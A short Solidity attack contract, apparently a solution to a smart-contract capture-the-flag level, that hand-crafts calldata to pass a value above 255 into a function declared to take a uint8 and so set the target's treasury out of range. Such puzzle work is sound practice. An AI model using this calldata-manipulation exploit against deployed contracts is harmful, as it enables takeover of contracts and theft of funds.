// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IHigherOrder {
    function registerTreasury(uint8) external;
    function claimLeadership() external;
    function treasury() external view returns (uint256);
    function commander() external view returns (address);
}

contract HigherOrderAttack2 {
    IHigherOrder public target;
    
    constructor(address _target) {
        target = IHigherOrder(_target);
    }
    
    function setTreasuryHigh() external {
        // Call registerTreasury with a value greater than 255
        // We'll use inline assembly to construct the calldata manually
        bytes memory data = abi.encodeWithSelector(
            IHigherOrder.registerTreasury.selector,
            uint256(300) // This will bypass the uint8 check
        );
        
        // Make the call with our crafted calldata
        (bool success,) = address(target).call(data);
        require(success, "registerTreasury failed");
    }
}